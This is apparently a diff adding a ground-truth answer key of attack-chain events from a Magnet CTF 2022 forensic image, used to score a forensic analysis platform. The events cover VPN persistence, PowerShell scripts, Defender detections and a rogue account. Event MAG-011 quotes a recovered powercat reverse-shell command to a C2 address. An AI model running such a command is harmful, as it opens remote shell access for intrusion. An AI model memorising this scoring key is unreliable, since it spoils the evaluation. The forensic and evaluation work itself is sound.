@@ -1,0 +1,486 @@
+{
+  "metadata": {
+    "case_id": "case_20260323_032324",
+    "case_name": "Magnet_CTF_2022",
+    "schema_version": "attack_chain_gt_DRAFT_v1",
+    "phase_taxonomy": "MITRE ATT&CK Tactics v14 + Anti-Forensics custom",
+    "sources_consulted": [
+      "docx_timeline (46 events, kept 8 after phase whitelist + intra-dedup)",
+      "v4_systematic (29 events, kept 9 after phase exclude + source exclude + intra-dedup)",
+      "milestones_md (7 events from paper/magnet_timeline_milestones.md)"
+    ],
+    "phase_whitelist_docx": [
+      "Anomaly Detection",
+      "Backdoor Active",
+      "Backdoor Attack",
+      "Backdoor Download",
+      "Defender Response",
+      "Malware Detection",
+      "Persistence",
+      "Suspicious Scripts"
+    ],
+    "phase_exclusions_v4": [
+      "P13_negative",
+      "P1_baseline",
+      "P2_user_activity",
+      "P7_user_awareness"
+    ],
+    "source_exclusions_v4": [],
+    "totals": {
+      "events": 18,
+      "in_scope_for_scoring": 17,
+      "out_of_scope_modules_not_yet_built": 1,
+      "cross_verified": 8,
+      "single_source": 10,
+      "es_verified": 18,
+      "es_unverified_in_scope": 0,
+      "unknown_tactic": 0
+    },
+    "out_of_scope_source_patterns": [
+      "outlook",
+      " ost",
+      "pst attachment",
+      "blockchain",
+      "etherscan",
+      "ledger live",
+      "visual studio code",
+      "sublime text",
+      "skype",
+      "wallet log",
+      "thumbcache",
+      "vscdb",
+      "sublime_session",
+      "skybridge",
+      "exchange-like wallet",
+      "external evidence",
+      "publicly visible",
+      "localstorage",
+      "metamask",
+      "firsttimeinfo",
+      ".ldb"
+    ],
+    "scoring_note": "Pass 2 curation precision/recall is computed using events with es_in_scope=True only. Out-of-scope events are kept here for transparency; they reference artifact types (email mailbox, blockchain, IDE state DB) not covered by the current ArshaLab modules. Adding such modules is an explicit future-work item and does not change the platform's modular architecture.",
+    "tactic_distribution_all": {
+      "Credential Access": 1,
+      "Defense Evasion": 3,
+      "Persistence": 2,
+      "Command and Control": 3,
+      "Execution": 9
+    },
+    "tactic_distribution_in_scope": {
+      "Credential Access": 1,
+      "Defense Evasion": 3,
+      "Persistence": 2,
+      "Command and Control": 3,
+      "Execution": 9
+    }
+  },
+  "events": [
+    {
+      "id": "MAG-001",
+      "timestamp": "2022-02-04 07:02:00.0000000",
+      "mitre_tactic": "Credential Access",
+      "mitre_technique": "T1110 - Brute Force / Failed Logon",
+      "description": "First failed logon attempt (Event ID 4625) - indicator of unauthorized access attempt",
+      "source_artifact": "EventLog",
+      "evidence_keywords": [
+        "07:02",
+        "07:02:00",
+        "2022-02-04",
+        "2022-02-04 07:02:00.0000000",
+        "4625",
+        "Event 4625",
+        "failed logon"
+      ],
+      "es_in_scope": false,
+      "es_verified": true,
+      "sources_citing": [
+        "docx-40",
+        "v4-11"
+      ],
+      "confidence": "cross-verified",
+      "original_phase": "Anomaly Detection",
+      "exclusion_reason": "GT data-quality refinement (2026-05-24): the 02-04 07:02 4625 record in ES is a Microsoft-Windows-EventLog SuppressDuplicateDuration config event (param1=86400, param2=SuppressDuplicateDuration), NOT an actual failed logon attempt. The docx_timeline source mis-classified this event. Sonnet correctly excluded it from attack chain. Removed from in-scope scoring; preserved here for transparency."
+    },
+    {
+      "id": "MAG-002",
+      "timestamp": "2022-02-04 07:06:46",
+      "mitre_tactic": "Defense Evasion",
+      "mitre_technique": "T1562.001 - Impair Defenses: Disable or Modify Tools",
+      "description": "Windows Defender configuration changed (Event ID 5007)",
+      "source_artifact": "EventLog/Reg",
+      "evidence_keywords": [
+        "5007"
+      ],
+      "es_in_scope": true,
+      "es_verified": true,
+      "sources_citing": [
+        "milestone-M1"
+      ],
+      "confidence": "single-source",
+      "original_phase": "attack_chain_milestone"
+    },
+    {
+      "id": "MAG-003",
+      "timestamp": "2022-02-06 07:15 UTC",
+      "mitre_tactic": "Persistence",
+      "mitre_technique": "T1543.003 - Create/Modify System Process: Windows Service",
+      "description": "ZeroTier VPN 1.8.4 installed (zerotier-one_x64.exe, SHA1: a5db8d5292b77e87). Driver zttap300.sys installed. Peer files in ProgramData\\zerotier.",
+      "source_artifact": "EventLog + Amcache + Shimcache + MFT + Registry",
+      "evidence_keywords": [
+        "1.8.4",
+        "7045",
+        "One",
+        "One.msi",
+        "ZeroTier",
+        "zerotier-one",
+        "zttap300.sys"
+      ],
+      "es_in_scope": true,
+      "es_verified": true,
+      "sources_citing": [
+        "v4-12",
+        "milestone-M2"
+      ],
+      "confidence": "cross-verified",
+      "original_phase": "P4_backdoor_setup"
+    },
+    {
+      "id": "MAG-004",
+      "timestamp": "2022-02-06 07:15:36",
+      "mitre_tactic": "Command and Control",
+      "mitre_technique": "T1572 - Protocol Tunneling (VPN)",
+      "description": "Firewall rule created for ZeroTierOne",
+      "source_artifact": "Registry",
+      "evidence_keywords": [
+        "ZeroTierOne"
+      ],
+      "es_in_scope": true,
+      "es_verified": true,
+      "sources_citing": [
+        "milestone-M4"
+      ],
+      "confidence": "single-source",
+      "original_phase": "attack_chain_milestone"
+    },
+    {
+      "id": "MAG-005",
+      "timestamp": "2022-02-06 07:15:37",
+      "mitre_tactic": "Command and Control",
+      "mitre_technique": "T1572 - Protocol Tunneling (VPN)",
+      "description": "Listening-port file `zerotier-one.port`",
+      "source_artifact": "MFT",
+      "evidence_keywords": [
+        "zerotier-one.port"
+      ],
+      "es_in_scope": true,
+      "es_verified": true,
+      "sources_citing": [
+        "milestone-M5"
+      ],
+      "confidence": "single-source",
+      "original_phase": "attack_chain_milestone"
+    },
+    {
+      "id": "MAG-006",
+      "timestamp": "2022-02-06 07:15:45",
+      "mitre_tactic": "Execution",
+      "mitre_technique": "T1059.001 - Command and Scripting Interpreter: PowerShell",
+      "description": "PowerShell `-ExecutionPolicy AllSigned`, target `file_deleter.ps1`",
+      "source_artifact": "MFT",
+      "evidence_keywords": [
+        "file_deleter.ps1"
+      ],
+      "es_in_scope": true,
+      "es_verified": true,
+      "sources_citing": [
+        "milestone-M10",
+        "milestone-M6"
+      ],
+      "confidence": "cross-verified",
+      "original_phase": "attack_chain_milestone"
+    },
+    {
+      "id": "MAG-007",
+      "timestamp": "2022-02-06 07:15:45",
+      "mitre_tactic": "Execution",
+      "mitre_technique": "T1059.001 - Command and Scripting Interpreter: PowerShell",
+      "description": "PowerShell script `AI_70BB.ps1` created in `\\Temp`",
+      "source_artifact": "MFT",
+      "evidence_keywords": [
+        "AI_70BB.ps1"
+      ],
+      "es_in_scope": true,
+      "es_verified": true,
+      "sources_citing": [
+        "milestone-M9",
+        "milestone-M7"
+      ],
+      "confidence": "cross-verified",
+      "original_phase": "attack_chain_milestone"
+    },
+    {
+      "id": "MAG-008",
+      "timestamp": "2022-02-06 07:16:07",
+      "mitre_tactic": "Command and Control",
+      "mitre_technique": "T1572 - Protocol Tunneling (VPN)",
+      "description": "Virtual adapter driver `zttap300.sys` installed (System32\\drivers)",
+      "source_artifact": "MFT + EventLog",
+      "evidence_keywords": [
+        "zttap300.sys"
+      ],
+      "es_in_scope": true,
+      "es_verified": true,
+      "sources_citing": [
+        "milestone-M8"
+      ],
+      "confidence": "single-source",
+      "original_phase": "attack_chain_milestone"
+    },
+    {
+      "id": "MAG-009",
+      "timestamp": "2022-02-09 22:44:11.0630581",
+      "mitre_tactic": "Defense Evasion",
+      "mitre_technique": "T1562 - Impair Defenses (adversary tool detected)",
+      "description": "Multiple Windows Defender events (1116 detection, 1117 action taken). Defender attempted to mitigate but malicious scripting continued.",
+      "source_artifact": "EventLog",
+      "evidence_keywords": [
+        "1116",
+        "1117",
+        "2022-02-09",
+        "2022-02-09 22:44:11.0630581",
+        "2022-02-09 22:44:16.2033444",
+        "22:44",
+        "22:44:11",
+        "22:44:16",
+        "Capfetox",
+        "Defender",
+        "Event 1116",
+        "Event 1117",
+        "Meterpreter"
+      ],
+      "es_in_scope": true,
+      "es_verified": true,
+      "sources_citing": [
+        "v4-13",
+        "docx-41",
+        "docx-42"
+      ],
+      "confidence": "cross-verified",
+      "original_phase": "Malware Detection"
+    },
+    {
+      "id": "MAG-010",
+      "timestamp": "2022-02-09 23:34:55.1225188",
+      "mitre_tactic": "Execution",
+      "mitre_technique": "T1059.001 - Command and Scripting Interpreter: PowerShell",
+      "description": "Event 4104 first ScriptBlock (168 total: 2 on 02-09, 6 on 02-11, 160 on 02-12)",
+      "source_artifact": "EventLog",
+      "evidence_keywords": [
+        "2022-02-09 23:34:55.1225188",
+        "2022-02-09",
+        "23:34",
+        "23:34:55",
+        "Event 4104",
+        "4104",
+        "ScriptBlock",
+        "168",
+        "160"
+      ],
+      "es_in_scope": true,
+      "es_verified": true,
+      "sources_citing": [
+        "docx-43"
+      ],
+      "confidence": "single-source",
+      "original_phase": "Backdoor Active"
+    },
+    {
+      "id": "MAG-011",
+      "timestamp": "2022-02-10 00:06:33.5838339",
+      "mitre_tactic": "Execution",
+      "mitre_technique": "T1059.001 - Command and Scripting Interpreter: PowerShell",
+      "description": "Backdoor command identified: 'powercat -c 192.168.191.253 -p 4444 -e cmd' (PowerShell session connecting to C2 with cmd shell access). Originally Base64-encoded in source file.",
+      "source_artifact": "EventLog",
+      "evidence_keywords": [
+        "00:06",
+        "00:06:33",
+        "192.168.191.253",
+        "2022-02-10",
+        "2022-02-10 00:06:33.5838339",
+        "4100",
+        "4444",
+        "600",
+        "8000",
+        "Event 4100",
+        "Event 600",
+        "powercat"
+      ],
+      "es_in_scope": true,
+      "es_verified": true,
+      "sources_citing": [
+        "docx-33",
+        "v4-14",
+        "docx-44"
+      ],
+      "confidence": "cross-verified",
+      "original_phase": "Backdoor Attack"
+    },
+    {
+      "id": "MAG-012",
+      "timestamp": "2022-02-11 23:19 UTC",
+      "mitre_tactic": "Execution",
+      "mitre_technique": "T1059.001 - Command and Scripting Interpreter: PowerShell",
+      "description": "goteem.ps1 PowerShell script (3,246 bytes) created in Documents/Minecraft - first malicious script",
+      "source_artifact": "MFT",
+      "evidence_keywords": [
+        "goteem.ps1",
+        "3246",
+        "Documents/Minecraft"
+      ],
+      "es_in_scope": true,
+      "es_verified": true,
+      "sources_citing": [
+        "v4-18"
+      ],
+      "confidence": "single-source",
+      "original_phase": "P8_malicious_scripting"
+    },
+    {
+      "id": "MAG-013",
+      "timestamp": "2022-02-11 23:22:52.3693218",
+      "mitre_tactic": "Execution",
+      "mitre_technique": "T1547.009 - Boot or Logon Autostart Execution: Shortcut Modification",
+      "description": "goteem (2).lnk (775 bytes)",
+      "source_artifact": "MFT",
+      "evidence_keywords": [
+        "2022-02-11 23:22:52.3693218",
+        "2022-02-11",
+        "23:22",
+        "23:22:52",
+        "775"
+      ],
+      "es_in_scope": true,
+      "es_verified": true,
+      "sources_citing": [
+        "docx-35"
+      ],
+      "confidence": "single-source",
+      "original_phase": "Suspicious Scripts"
+    },
+    {
+      "id": "MAG-014",
+      "timestamp": "2022-02-11 23:25 UTC",
+      "mitre_tactic": "Execution",
+      "mitre_technique": "T1059.001 - Command and Scripting Interpreter: PowerShell",
+      "description": "goteem2.ps1 (3,234 bytes) - second variant created in same folder",
+      "source_artifact": "MFT",
+      "evidence_keywords": [
+        "goteem2.ps1",
+        "3234"
+      ],
+      "es_in_scope": true,
+      "es_verified": true,
+      "sources_citing": [
+        "v4-19"
+      ],
+      "confidence": "single-source",
+      "original_phase": "P8_malicious_scripting"
+    },
+    {
+      "id": "MAG-015",
+      "timestamp": "2022-02-11 23:26:51.7850954",
+      "mitre_tactic": "Execution",
+      "mitre_technique": "T1547.009 - Boot or Logon Autostart Execution: Shortcut Modification",
+      "description": "goteem2.lnk (780 bytes)",
+      "source_artifact": "MFT",
+      "evidence_keywords": [
+        "2022-02-11 23:26:51.7850954",
+        "2022-02-11",
+        "23:26",
+        "23:26:51",
+        "goteem2.lnk",
+        "780"
+      ],
+      "es_in_scope": true,
+      "es_verified": true,
+      "sources_citing": [
+        "docx-36"
+      ],
+      "confidence": "single-source",
+      "original_phase": "Suspicious Scripts"
+    },
+    {
+      "id": "MAG-016",
+      "timestamp": "2022-02-12",
+      "mitre_tactic": "Execution",
+      "mitre_technique": "T1059.001 - Command and Scripting Interpreter: PowerShell",
+      "description": "LNK shortcut to goteem2.ps1 created - indicates execution attempt",
+      "source_artifact": "LNK files",
+      "evidence_keywords": [
+        "goteem2.ps1",
+        "LNK"
+      ],
+      "es_in_scope": true,
+      "es_verified": true,
+      "sources_citing": [
+        "v4-22"
+      ],
+      "confidence": "single-source",
+      "original_phase": "P10_attack_execution"
+    },
+    {
+      "id": "MAG-017",
+      "timestamp": "2022-02-12 00:41:00.0000000",
+      "mitre_tactic": "Defense Evasion",
+      "mitre_technique": "T1564.001 - Hide Artifacts: Hidden Files and Directories",
+      "description": "Suspicious folder 'lolololol' created with matrix.bat (164 bytes) inside",
+      "source_artifact": "MFT",
+      "evidence_keywords": [
+        "00:41",
+        "00:41:00",
+        "164",
+        "2022-02-12",
+        "2022-02-12 00:41:00.0000000",
+        "lolololol",
+        "matrix.bat"
+      ],
+      "es_in_scope": true,
+      "es_verified": true,
+      "sources_citing": [
+        "docx-45",
+        "docx-46",
+        "v4-20"
+      ],
+      "confidence": "cross-verified",
+      "original_phase": "Suspicious Scripts"
+    },
+    {
+      "id": "MAG-018",
+      "timestamp": "2022-02-12 01:29:43.1362394",
+      "mitre_tactic": "Persistence",
+      "mitre_technique": "T1136.001 - Create Account: Local Account",
+      "description": "Unauthorized user account 'minecraftsteve' created via SYSTEM (S-1-5-18). SID S-1-5-21-3341181097. Domain DESKTOP-SKPTDIO. Event ID 4720.",
+      "source_artifact": "EventLog",
+      "evidence_keywords": [
+        "01:29",
+        "01:29:43",
+        "2022-02-12",
+        "2022-02-12 01:29:43.1362394",
+        "4720",
+        "DESKTOP-SKPTDIO",
+        "Event 4720",
+        "S-1-5-18",
+        "minecraftsteve"
+      ],
+      "es_in_scope": true,
+      "es_verified": true,
+      "sources_citing": [
+        "v4-21",
+        "docx-39"
+      ],
+      "confidence": "cross-verified",
+      "original_phase": "Persistence"
+    }
+  ]
+}
